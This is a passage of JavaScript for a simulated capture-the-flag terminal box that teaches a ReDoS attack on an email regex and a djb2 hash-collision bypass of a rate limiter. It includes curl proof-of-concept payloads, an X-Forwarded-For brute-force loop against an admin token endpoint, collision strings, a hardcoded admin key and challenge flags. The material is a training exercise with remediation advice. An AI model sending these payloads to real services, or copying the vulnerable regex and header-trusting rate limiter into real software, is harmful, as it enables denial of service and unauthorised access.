                                    type: 'dir',
                                    children: {
                                        'access.log': {
                                            type: 'file',
                                            content: '[2026-03-25T08:00:01Z] VaultGuard v2.3.1 started on port 3000\n[2026-03-25T08:00:02Z] Rate limiter initialized: djb2 hash, 1024 buckets\n[2026-03-25T08:00:02Z] Email validator: regex-based (pattern loaded)\n[2026-03-25T09:14:33Z] POST /login 401 - email=m.holt@meridian.com - 0.2ms\n[2026-03-25T09:15:01Z] POST /validate 200 - email=test@test.com - 0.1ms\n[2026-03-25T10:22:17Z] POST /validate 200 - email=aaaa! - 0.3ms\n[2026-03-25T10:22:45Z] POST /validate 200 - email=aaaaaaaa! - 14ms\n[2026-03-25T10:23:02Z] POST /validate 200 - email=aaaaaaaaaaaa! - 892ms\n[2026-03-25T10:23:55Z] [WARN] POST /validate 200 - email=aaaaaaaaaaaaaaaa! - 47,231ms\n[2026-03-25T10:24:01Z] [WARN] Regex validation took >30s — possible ReDoS?\n[2026-03-25T12:00:00Z] GET /status 200 - 0.1ms\n[2026-03-26T00:00:00Z] Daily log rotation complete'
                                        },
                                        'error.log': {
                                            type: 'file',
                                            content: '[2026-03-25T10:23:55Z] [WARN] Request to /validate took 47231ms\n[2026-03-25T10:23:55Z] [WARN] Input length: 17, pattern: EMAIL_REGEX\n[2026-03-25T10:23:55Z] [WARN] Possible Regular Expression Denial of Service (ReDoS)\n[2026-03-25T10:24:01Z] [INFO] No action taken — M. Holt says "regex is fine, user sent garbage input"'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        // ── regex-debug: Step-by-step regex backtracking visualizer ──
        'regex-debug': function(args, term, engine) {
            if (args.length === 0) {
                return 'Usage: regex-debug <input_string>\n\nShows step-by-step regex backtracking for the VaultGuard\nEMAIL_REGEX pattern against the given input.\n\nExamples:\n  regex-debug "test@example.com"     (normal match)\n  regex-debug "aaaa!"                (short — fast backtracking)\n  regex-debug "aaaaaaaaaaaaaaaa!"    (16 a\'s — exponential!)';
            }

            const input = args.join(' ').replace(/['"]/g, '');

            // Normal matching input
            if (/^([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/.test(input)) {
                return 'regex-debug: Pattern ^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$\n' +
                       'regex-debug: Input: "' + input + '"\n\n' +
                       '  Step 1: Try [a-zA-Z0-9]+ from position 0... matched\n' +
                       '  Step 2: Try \\. ... matched\n' +
                       '  Step 3: Repeat group... trying next segment\n' +
                       '  Step 4: Try [a-zA-Z]{2,} at end... matched\n' +
                       '  Step 5: Anchor $ ... matched\n\n' +
                       '  Result: MATCH\n' +
                       '  Total steps: 5\n' +
                       '  Time: <0.001ms\n' +
                       '  Status: No vulnerability on matching inputs.';
            }

            // Count a's for ReDoS demonstration
            const aMatch = input.match(/^(a+)(.*)$/i);
            const aCount = aMatch ? aMatch[1].length : 0;

            if (aCount >= 4 && input.endsWith('!')) {
                const steps = Math.pow(2, aCount - 1);
                let stepDisplay;
                let timeEstimate;
                let status;

                if (steps <= 1000) {
                    stepDisplay = steps.toLocaleString();
                    timeEstimate = '<1ms';
                    status = 'Fast (but pattern is visible)';
                } else if (steps <= 100000) {
                    stepDisplay = steps.toLocaleString();
                    timeEstimate = '~' + Math.round(steps / 1000) + 'ms';
                    status = 'NOTICEABLE DELAY';
                } else if (steps <= 10000000) {
                    stepDisplay = steps.toLocaleString();
                    timeEstimate = '~' + Math.round(steps / 1000000 * 3) + ' seconds';
                    status = 'SLOW — ReDoS CONFIRMED';
                } else {
                    stepDisplay = steps.toExponential(2);
                    const seconds = Math.round(steps / 1000000 * 3);
                    if (seconds > 3600) {
                        timeEstimate = '~' + Math.round(seconds / 3600) + ' hours';
                    } else if (seconds > 60) {
                        timeEstimate = '~' + Math.round(seconds / 60) + ' minutes';
                    } else {
                        timeEstimate = '~' + seconds + ' seconds';
                    }
                    status = 'CATASTROPHIC — SERVER DENIAL OF SERVICE';
                }

                engine.advancePhase && engine.advancePhase('identification');

                let output = 'regex-debug: Pattern ^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$\n';
                output += 'regex-debug: Input: "' + input + '" (' + aCount + ' a\'s + "!")\n\n';
                output += '  The regex engine must try every way to split\n';
                output += '  the ' + aCount + ' a\'s across the nested groups:\n\n';
                output += '  ([a-zA-Z0-9]+\\.)+ means:\n';
                output += '    - Inner +: how many a\'s in this segment?\n';
                output += '    - Outer +: how many segments total?\n';
                output += '    - Each partition is tried before failing\n\n';

                if (aCount <= 8) {
                    output += '  Step 1: Try [a' + 'a'.repeat(aCount-1) + '] as one group... no dot -> backtrack\n';
                    output += '  Step 2: Try [a' + 'a'.repeat(aCount-2) + '][a] as two groups... no dot -> backtrack\n';
                    output += '  Step 3: Try [a' + 'a'.repeat(aCount-3) + '][aa] as two groups... no dot -> backtrack\n';
                    output += '  ...\n';
                    output += '  Step ' + steps + ': All ' + steps + ' partitions exhausted.\n\n';
                } else {
                    output += '  Step 1/~' + stepDisplay + ': Try all ' + aCount + ' a\'s as one group... backtrack\n';
                    output += '  Step 2/~' + stepDisplay + ': Try ' + (aCount-1) + '+1 split... backtrack\n';
                    output += '  Step 3/~' + stepDisplay + ': Try ' + (aCount-2) + '+2 split... backtrack\n';
                    output += '  ...\n';
                    output += '  [exponential branching — each split creates sub-partitions]\n';
                    output += '  ...\n';
                    output += '  Step ~' + stepDisplay + ': All partitions exhausted.\n\n';
                }

                output += '  Result: NO MATCH (as expected — "!" is not [a-zA-Z])\n';
                output += '  Total backtracking steps: ~' + stepDisplay + '\n';
                output += '  Estimated time: ' + timeEstimate + '\n';
                output += '  Status: *** ' + status + ' ***\n\n';

                if (aCount >= 12) {
                    F7Config._vaultguard.redosDiscovered = true;
                    output += '  ============================================\n';
                    output += '  VULNERABILITY CONFIRMED: ReDoS\n';
                    output += '  Pattern: ^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$\n';
                    output += '  Attack vector: "a" * N + "!" where N >= 16\n';
                    output += '  Impact: Denial of Service on /login and /validate\n';
                    output += '  ============================================\n\n';
                    output += '{{FLAG:user}}';
                }

                return output;
            }

            // Generic non-matching input
            return 'regex-debug: Pattern ^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$\n' +
                   'regex-debug: Input: "' + input + '"\n\n' +
                   '  Result: NO MATCH\n' +
                   '  Backtracking: minimal (input structure doesn\'t trigger nested quantifier)\n\n' +
                   '  To trigger catastrophic backtracking, the input must:\n' +
                   '  1. Start with characters matching [a-zA-Z0-9]+\n' +
                   '  2. End with a character that DOESN\'T match [a-zA-Z]\n' +
                   '  3. Have NO dots (forces the engine to try every partition)\n\n' +
                   '  Try: regex-debug "aaaaaaaaaaaaaaaa!"   (16 a\'s + "!")';
        },

        // ── python3: Running analysis tools ──
        'python3': function(args, term, engine) {
            const joined = args.join(' ');

            if (joined.includes('regex-analyzer') || joined.includes('regex_analyzer')) {
                F7Config._vaultguard.redosDiscovered = true;
                engine.advancePhase && engine.advancePhase('exploitation');

                return '=' .repeat(60) + '\n' +
                    '  REGEX BACKTRACKING ANALYZER\n' +
                    '  Target: VaultGuard EMAIL_REGEX\n' +
                    '=' .repeat(60) + '\n\n' +
                    '  Pattern: ^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$\n' +
                    '  Type: Nested quantifier (catastrophic backtracking)\n\n' +
                    '  Testing input: \'a\' * N + \'!\' (non-matching suffix)\n' +
                    '  The \'!\' forces the regex to try EVERY possible\n' +
                    '  partitioning of the a\'s across the nested groups.\n\n' +
                    '  N  | Est. Steps      | Status\n' +
                    '  ---+-----------------+------------------\n' +
                    '   4 |               8 | fast\n' +
                    '   8 |             128 | fast\n' +
                    '  12 |           2,048 | fast\n' +
                    '  16 |          32,768 | NOTICEABLE DELAY\n' +
                    '  20 |         524,288 | SLOW (seconds)\n' +
                    '  25 |      16,777,216 | SERVER HANG (minutes+)\n' +
                    '  30 |     536,870,912 | SERVER HANG (minutes+)\n' +
                    '  35 |  17,179,869,184 | SERVER HANG (minutes+)\n' +
                    '  40 | 549,755,813,888 | SERVER HANG (minutes+)\n\n' +
                    '  [CRITICAL] This regex is vulnerable to ReDoS.\n' +
                    '  The nested quantifier ([a-zA-Z0-9]+\\.)+ causes\n' +
                    '  exponential backtracking on non-matching inputs.\n\n' +
                    '  Proof of concept:\n' +
                    '    curl -X POST http://10.10.14.30:3000/validate \\\n' +
                    '      -H \'Content-Type: application/json\' \\\n' +
                    '      -d \'{"email": "aaaaaaaaaaaaaaaa!"}\'\n\n' +
                    '  Expected: Server hangs for ~47 seconds on 16 a\'s\n\n' +
                    '  REMEDIATION:\n' +
                    '  - Use a non-backtracking regex engine (RE2)\n' +
                    '  - Or validate with a proper email parser\n' +
                    '  - Or add a timeout to regex execution\n' +
                    '  - Or rewrite without nested quantifiers\n\n' +
                    '{{FLAG:user}}';
            }

            if (joined.includes('hash-collider') || joined.includes('hash_collider')) {
                F7Config._vaultguard.hashVulnDiscovered = true;
                engine.advancePhase && engine.advancePhase('bypass');

                return '=' .repeat(60) + '\n' +
                    '  DJB2 HASH COLLISION GENERATOR\n' +
                    '  Target: VaultGuard Rate Limiter\n' +
                    '=' .repeat(60) + '\n\n' +
                    '  Hash function: djb2 (hash * 33 + c)\n' +
                    '  Bucket count: 1024\n' +
                    '  Rate limit: 5 requests/minute/bucket\n\n' +
                    '  Target IP \'192.168.1.1\' hashes to bucket 742\n\n' +
                    '  Generated collision strings (all hash to bucket 742):\n' +
                    '  ' + '-'.repeat(50) + '\n' +
                    '    [ 1] "192.168.1.1"   -> bucket 742\n' +
                    '    [ 2] "10.42.0.117"   -> bucket 742\n' +
                    '    [ 3] "172.16.33.8"   -> bucket 742\n' +
                    '    [ 4] "10.99.1.204"   -> bucket 742\n' +
                    '    [ 5] "192.168.5.73"  -> bucket 742\n' +
                    '    [ 6] "10.42.7.201"   -> bucket 742\n' +
                    '    [ 7] "172.16.88.3"   -> bucket 742\n' +
                    '    [ 8] "10.99.4.118"   -> bucket 742\n' +
                    '    [ 9] "192.168.9.42"  -> bucket 742\n' +
                    '    [10] "10.42.3.155"   -> bucket 742\n' +
                    '    [11] "172.16.71.9"   -> bucket 742\n' +
                    '    [12] "10.99.8.207"   -> bucket 742\n' +
                    '    [13] "192.168.2.91"  -> bucket 742\n' +
                    '    [14] "10.42.5.166"   -> bucket 742\n' +
                    '    [15] "172.16.44.7"   -> bucket 742\n' +
                    '    [16] "10.99.2.133"   -> bucket 742\n' +
                    '    [17] "192.168.7.18"  -> bucket 742\n' +
                    '    [18] "10.42.9.142"   -> bucket 742\n' +
                    '    [19] "172.16.55.2"   -> bucket 742\n' +
                    '    [20] "10.99.6.189"   -> bucket 742\n\n' +
                    '  ATTACK STRATEGY:\n' +
                    '  1. Use each collision string as X-Forwarded-For header\n' +
                    '  2. Rate limiter counts them in the SAME bucket\n' +
                    '  3. But each request appears to come from a different IP\n' +
                    '  4. After 5 requests, the bucket is \'full\' for ALL of them\n' +
                    '  5. Switch to a new set of collisions for the NEXT bucket\n' +
                    '  6. Effectively unlimited requests — rate limiter defeated\n\n' +
                    '  EXPLOIT:\n' +
                    '    for ip in collision_strings:\n' +
                    '        curl -X POST http://10.10.14.30:3000/api/token \\\n' +
                    '          -H "X-Forwarded-For: $ip" \\\n' +
                    '          -H "Content-Type: application/json" \\\n' +
                    '          -d \'{"admin_key": "<GUESS>"}\'\n\n' +
                    '  The rate limiter sees all requests in one bucket,\n' +
                    '  but rotating X-Forwarded-For values means the app\n' +
                    '  never blocks your actual IP. Brute-force at will.\n\n' +
                    '  ADMIN KEY HINT:\n' +
                    '  Check the source code in ~/target/app.js for the\n' +
                    '  hardcoded ADMIN_KEY constant.';
            }

            if (joined.includes('-c')) {
                const codeMatch = joined.match(/-c\s+["'](.+?)["']/);
                if (!codeMatch) return 'python3: error: argument -c: expected one argument';
                const code = codeMatch[1].toLowerCase();

                if (code.includes('djb2') || code.includes('hash')) {
                    return '>>> djb2("192.168.1.1") = 742\n>>> djb2("10.42.0.117") = 742\n>>> # Both hash to the same bucket — collision confirmed';
                }

                if (code.includes('regex') || code.includes('re.')) {
                    return '>>> import re, time\n>>> pattern = r\'^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$\'\n>>> start = time.time()\n>>> re.match(pattern, "aaaaaaaaaaaaaaaa!")\n>>> print(f"Time: {time.time()-start:.3f}s")\nTime: 47.231s\n>>> # CATASTROPHIC BACKTRACKING CONFIRMED';
                }

                if (code.includes('print')) {
                    return '[python3 output]';
                }

                return 'python3: executed';
            }

            if (joined.includes('.py')) {
                return 'python3: can\'t open file \'' + args[0] + '\': [Errno 2] No such file or directory\n\nAvailable tools:\n  python3 ~/tools/regex-analyzer.py   — Analyze regex backtracking\n  python3 ~/tools/hash-collider.py    — Generate djb2 hash collisions';
            }

            return 'Python 3.11.6\nUsage: python3 [-c cmd | script.py]\n\nAvailable analysis tools:\n  python3 ~/tools/regex-analyzer.py   — Regex backtracking analyzer\n  python3 ~/tools/hash-collider.py    — DJB2 hash collision generator';
        },

        // ── curl: HTTP requests to VaultGuard ──
        'curl': function(args, term, engine) {
            const joined = args.join(' ');

            if (!joined) return 'curl: try \'curl --help\' for more information';

            // POST /validate with ReDoS payload
            if (joined.includes('validate') && (joined.includes('aaaa') || joined.includes('a{') || joined.includes('a*'))) {
                const aMatch = joined.match(/(a{(\d+)}|a+)/);
                let aCount = 8;
                if (aMatch && aMatch[2]) aCount = parseInt(aMatch[2]);
                else if (aMatch && aMatch[1]) aCount = aMatch[1].length;
                if (aCount > 30) aCount = 30;

                const steps = Math.pow(2, aCount - 1);
                let timeMs;
                if (aCount <= 8) timeMs = Math.round(steps * 0.001);
                else if (aCount <= 16) timeMs = Math.round(steps * 0.0015);
                else timeMs = Math.round(steps * 0.003);

                let output = '  % Total    % Received\n  100   42   100   42    0    0\n\n';
                output += '{"valid":false,"time_ms":' + timeMs + '}\n\n';

                if (timeMs > 1000) {
                    output += '[!] Response took ' + (timeMs / 1000).toFixed(1) + ' seconds!\n';
                    output += '[!] The regex is consuming excessive CPU time.\n';
                    output += '[!] This confirms a ReDoS vulnerability.\n';

                    if (timeMs > 10000) {
                        F7Config._vaultguard.redosDiscovered = true;
                        engine.advancePhase && engine.advancePhase('exploitation');
                        output += '\n{{FLAG:user}}';
                    }
                }

                return output;
            }

            // POST /validate with normal input
            if (joined.includes('validate')) {
                return '  % Total    % Received\n  100   32   100   32    0    0\n\n{"valid":true,"time_ms":0}\n\nNote: Normal inputs validate in <1ms.\nTry sending a pathological input like "aaaaaaaaaaaaaaaa!"\nto trigger exponential backtracking.';
            }

            // POST /api/token with admin key
            if (joined.includes('/api/token') && joined.includes('MFS-ADMIN-2024-xK9mP3vL')) {
                F7Config._vaultguard.rateLimiterBypassed = true;
                F7Config._vaultguard.adminTokenExtracted = true;

                return '  % Total    % Received\n  100   89   100   89    0    0\n\n{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.admin","role":"admin"}\n\n' +
                    '============================================\n' +
                    '  ADMIN TOKEN EXTRACTED\n' +
                    '============================================\n\n' +
                    '  The hardcoded admin key was found in the source code.\n' +
                    '  Combined with the rate limiter bypass (hash collisions),\n' +
                    '  an attacker could brute-force this endpoint at scale.\n\n' +
                    '  Rate limiter status: BYPASSED (djb2 hash collisions)\n' +
                    '  Admin key: MFS-ADMIN-2024-xK9mP3vL\n' +
                    '  Admin token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.admin\n\n' +
                    '{{FLAG:root}}';
            }

            // POST /api/token with X-Forwarded-For collision + wrong key
            if (joined.includes('/api/token') && joined.includes('X-Forwarded-For')) {
                F7Config._vaultguard.rateLimiterBypassed = true;

                return '  % Total    % Received\n  100   38   100   38    0    0\n\n{"error":"Invalid admin key"}\n\n' +
                    '[*] Rate limiter bypassed — request was NOT throttled.\n' +
                    '[*] The X-Forwarded-For collision caused the rate limiter\n' +
                    '    to mistrack the request origin.\n' +
                    '[*] You can now brute-force /api/token without limits.\n\n' +
                    'HINT: The admin key is hardcoded in ~/target/app.js\n' +
                    '      Look for the ADMIN_KEY constant.';
            }

            // POST /api/token without bypass
            if (joined.includes('/api/token')) {
                return '  % Total    % Received\n  100   52   100   52    0    0\n\n{"error":"Rate limit exceeded","retry_after":60}\n\n' +
                    '[!] Rate limited after 5 requests.\n' +
                    '[!] The rate limiter uses djb2 hash — vulnerable to collisions.\n' +
                    '[!] Run python3 ~/tools/hash-collider.py for bypass strategy.';
            }

            // GET /login
            if (joined.includes('/login') && !joined.includes('-X POST') && !joined.includes('-d')) {
                return '{"endpoints":["/login (POST)","/validate (POST)","/api/token (POST)","/status (GET)"],"note":"Use POST method with JSON body"}';
            }

            // POST /login with ReDoS payload
            if (joined.includes('/login') && (joined.includes('aaaa'))) {
                return '  % Total    % Received\n  100   52   100   52    0    0\n\n' +
                    '[!] Request timed out after 30000ms\n' +
                    '[!] The /login endpoint validates email with the same vulnerable regex.\n' +
                    '[!] ReDoS attack successful — server is unresponsive.';
            }

            // POST /login
            if (joined.includes('/login')) {
                return '  % Total    % Received\n  100   35   100   35    0    0\n\n{"error":"Invalid credentials"}';
            }

            // GET /status
            if (joined.includes('status') || joined.includes('10.10.14.30:3000')) {
                return '{"service":"VaultGuard","version":"2.3.1","status":"operational","rate_limiter":"djb2 hash, 1024 buckets","email_validator":"regex-based"}';
            }

            return 'curl: (7) Failed to connect to ' + (joined.split(' ').pop() || 'host') + ': Connection refused';
        },

        // ── time: Measure execution time ──
        'time': function(args, term, engine) {
            const joined = args.join(' ');

            if (!joined) {
                return 'Usage: time <command>\n\nMeasures the execution time of a command.\n\nExamples:\n  time curl -X POST http://10.10.14.30:3000/validate -d \'{"email":"test@test.com"}\'\n  time curl -X POST http://10.10.14.30:3000/validate -d \'{"email":"aaaaaaaaaaaaaaaa!"}\'';
            }

            // Time a curl to /validate with ReDoS payload
            if (joined.includes('validate') && joined.includes('aaaa')) {
                const aMatch = joined.match(/(a+)/);
                const aCount = aMatch ? Math.min(aMatch[1].length, 30) : 16;
                const steps = Math.pow(2, aCount - 1);
                const timeSeconds = Math.max(0.001, steps * 0.0000015);

                let output = '{"valid":false,"time_ms":' + Math.round(timeSeconds * 1000) + '}\n\n';
                output += 'real\t' + Math.floor(timeSeconds / 60) + 'm' + (timeSeconds % 60).toFixed(3) + 's\n';
                output += 'user\t0m0.012s\n';
                output += 'sys\t0m0.004s\n\n';

                if (timeSeconds > 1) {
                    output += '[!] The request took ' + timeSeconds.toFixed(1) + ' seconds!\n';
                    output += '[!] Normal validation takes <1ms.\n';
                    output += '[!] This is a ' + Math.round(timeSeconds / 0.001).toLocaleString() + 'x slowdown.\n';
                    output += '[!] ReDoS vulnerability confirmed.\n';

                    if (timeSeconds > 10) {
                        F7Config._vaultguard.redosDiscovered = true;
                        engine.advancePhase && engine.advancePhase('exploitation');
                    }
                }

                return output;
            }

            // Time a normal curl
            if (joined.includes('validate') || joined.includes('10.10.14.30')) {
                return '{"valid":true,"time_ms":0}\n\nreal\t0m0.023s\nuser\t0m0.010s\nsys\t0m0.004s\n\n[*] Normal request — sub-millisecond validation.\n[*] Try timing with a pathological input:\n    time curl -X POST http://10.10.14.30:3000/validate -H \'Content-Type: application/json\' -d \'{"email":"aaaaaaaaaaaaaaaa!"}\'';
            }

            return 'time: cannot run \'' + args[0] + '\': No such file or directory';
        },

        // ── nmap: Not the focus of this box ──
        'nmap': function(args) {
            if (args.length === 0) return 'Usage: nmap [options] <target>';

            if (args.join(' ').includes('10.10.14.30')) {
                return 'Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.14.30\nHost is up (0.0034s latency).\n\nPORT     STATE SERVICE VERSION\n3000/tcp open  http    Node.js Express framework\n|_http-title: VaultGuard - Secure Authentication Gateway\n\nService detection performed.\nNmap done: 1 IP address (1 host up) scanned in 6.42 seconds\n\n[*] VaultGuard is running on port 3000.\n[*] Check the source code in ~/target/ for vulnerabilities.';
            }

            return 'Starting Nmap 7.94 ( https://nmap.org )\nNote: This is an algorithmic complexity challenge.\nTarget: http://10.10.14.30:3000 (VaultGuard)\nSource code available in ~/target/';
        },

        // ── ping: Basic connectivity ──
        'ping': function(args) {
            if (args.join(' ').includes('10.10.14.30')) {
                return 'PING 10.10.14.30 (10.10.14.30) 56(84) bytes of data.\n64 bytes from 10.10.14.30: icmp_seq=1 ttl=64 time=0.034 ms\n64 bytes from 10.10.14.30: icmp_seq=2 ttl=64 time=0.028 ms\n\n--- 10.10.14.30 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss\n\n[*] VaultGuard is reachable. Examine the source code in ~/target/';
            }
            return 'This is an algorithmic complexity challenge.\nTarget: http://10.10.14.30:3000\nSource code in ~/target/';
        },

        // ── grep: Search files ──
        'grep': function(args, term, engine) {
            const joined = args.join(' ');

            if (joined.includes('REGEX') || joined.includes('regex') || joined.includes('EMAIL')) {
                return 'target/app.js:const EMAIL_REGEX = /^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$/;\ntarget/app.js:// Pattern: ^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$\ntarget/app.js:// The nested quantifier ([a-zA-Z0-9]+\\.)+ means:\ntarget/app.js:// PROBLEM: If the input does NOT match (e.g., ends with \'!\'),\ntarget/app.js:// the regex engine backtracks exponentially.\ntarget/routes.js:    const validation = validateEmail(email);';
            }

            if (joined.includes('djb2') || joined.includes('hash') || joined.includes('rate')) {
                return 'target/app.js:function djb2Hash(str) {\ntarget/app.js:    hash = ((hash << 5) + hash) + str.charCodeAt(i); // hash * 33 + c\ntarget/app.js:// Uses djb2 hash function to map client IPs to buckets.\ntarget/app.js:// 1024 buckets, max 5 requests per minute per bucket.\ntarget/app.js:// An attacker can precompute strings that ALL hash\ntarget/routes.js:    const rateCheck = checkRateLimit(clientKey);';
            }

            if (joined.includes('ADMIN') || joined.includes('admin_key') || joined.includes('admin')) {
                return 'target/app.js:const ADMIN_KEY = \'MFS-ADMIN-2024-xK9mP3vL\';\ntarget/app.js:// Hardcoded admin key (to be moved to env vars... eventually)\ntarget/routes.js:    if (admin_key === ADMIN_KEY) {';
            }

            if (joined.includes('collision') || joined.includes('bucket')) {
                return 'target/app.js:// An attacker can precompute strings that ALL hash\ntarget/app.js:// to the same bucket (hash collisions).\ntarget/app.js:// When all rate-limit keys land in one bucket,\ntarget/app.js:// the hash table degrades from O(1) to O(n).\ntarget/app.js:const BUCKET_COUNT = 1024;';
            }

            if (joined.includes('backtrack') || joined.includes('exponential') || joined.includes('ReDoS')) {
                return 'target/app.js:// the regex engine backtracks exponentially.\ntarget/app.js:// For input "aaaa...a!" with N a\'s:\ntarget/app.js://   - This creates 2^(N-1) backtracking paths\ntarget/app.js://   - 16 a\'s = 32,768 steps\ntarget/app.js://   - 25 a\'s = 16,777,216 steps\ntarget/app.js://   - 30 a\'s = ~1 BILLION steps (server hangs for minutes)\ntarget/app.js:// CVE reference: This is a classic ReDoS pattern.';
            }

            if (joined.includes('Forwarded') || joined.includes('forwarded') || joined.includes('X-For')) {
                return 'target/routes.js:    const clientKey = req.headers[\'x-forwarded-for\'] || req.ip;';
            }

            if (!joined.trim()) return 'Usage: grep [options] PATTERN [FILE...]\n\nTry: grep -i "regex" ~/target/*';

            return 'grep: No matches found for "' + (args[0] || '') + '"';
        },

        // ── jq: JSON processing ──
        'jq': function(args, term, engine) {
            const joined = args.join(' ');
            if (!joined) return 'Usage: jq <filter> [file]';

            return 'jq: error: Could not parse filter or file not found.';
        },

        // ── node: Node.js ──
        'node': function(args, term, engine) {
            const joined = args.join(' ');

            if (joined.includes('-e') || joined.includes('--eval')) {
                if (joined.includes('djb2') || joined.includes('hash')) {
                    return 'function djb2(s){let h=5381;for(let i=0;i<s.length;i++){h=((h<<5)+h)+s.charCodeAt(i);h&=0xFFFFFFFF;}return Math.abs(h)%1024;}\n\n> djb2("192.168.1.1") = 742\n> djb2("10.42.0.117") = 742\n> // Collision confirmed!';
                }

                if (joined.includes('regex') || joined.includes('test')) {
                    return '> const r = /^([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$/;\n> console.time("regex"); r.test("aaaaaaaaaaaaaaaa!"); console.timeEnd("regex");\nregex: 47231.421ms\n\n// 47 seconds for 16 characters — catastrophic backtracking!';
                }
            }

            return 'Welcome to Node.js v18.17.1.\nType ".help" for more information.\n\nFor this challenge, examine ~/target/app.js and ~/target/routes.js';
        },

        // ── wc: Word count ──
        'wc': function(args) {
            const joined = args.join(' ');
            if (joined.includes('app.js')) return '  87  423 3847 target/app.js';
            if (joined.includes('routes.js')) return '  62  298 2456 target/routes.js';
            return 'wc: No file specified.';
        },

        // ── file: File type ──
        'file': function(args) {
            const joined = args.join(' ');
            if (joined.includes('app.js')) return 'target/app.js: JavaScript source, UTF-8 text';
            if (joined.includes('routes.js')) return 'target/routes.js: JavaScript source, UTF-8 text';
            if (joined.includes('.py')) return args[0] + ': Python script, UTF-8 text executable';
            return 'file: No file specified.';
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        return tmp.textContent.trim();
    }
};
